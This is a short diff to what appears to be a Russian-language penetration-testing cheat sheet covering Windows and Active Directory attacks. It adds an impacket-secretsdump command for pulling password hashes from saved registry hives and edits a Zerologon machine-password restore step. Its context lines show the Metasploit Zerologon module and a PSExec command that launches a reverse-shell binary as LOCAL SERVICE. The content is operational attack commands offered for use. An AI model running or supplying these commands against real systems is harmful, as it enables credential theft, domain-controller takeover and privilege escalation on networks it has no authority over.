@@ -318,7 +318,8 @@ https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.ne
     lget system.save
     lget sam.save
     lget security.save
-
+    impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+    
     - восстановление пароля машины, после сброса
         $ msfconsole
     use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
@@ -329,7 +330,8 @@ https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.ne
     set PASSWORD <$MACHINE.ACC hex password>
     run
             или
-    python3 reinstall_original_pw.py DC-01$ 10.10.0.1 b4d1….
+    python3 restorepassword.py DC-01$ 10.10.0.1 hex-password-DC
+    
 # Токен имперсонейшн
 
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
